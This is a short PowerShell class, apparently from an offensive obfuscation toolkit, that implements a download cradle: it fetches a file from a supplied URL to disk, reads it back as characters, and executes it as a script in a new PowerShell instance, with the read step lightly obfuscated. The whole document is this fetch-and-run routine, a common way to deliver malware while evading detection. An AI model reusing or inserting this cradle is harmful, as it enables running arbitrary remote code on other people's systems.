Class ObfDownloadFile13 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\8
        (New-Object Net.WebClient).DownloadFile($url,$path);[PowerShell]::Create().AddScript((([System.String]::Join('',(([IO.File]::ReadAllBytes($path)|ForEach{$_-As'Char'})))))).Invoke()
    }

}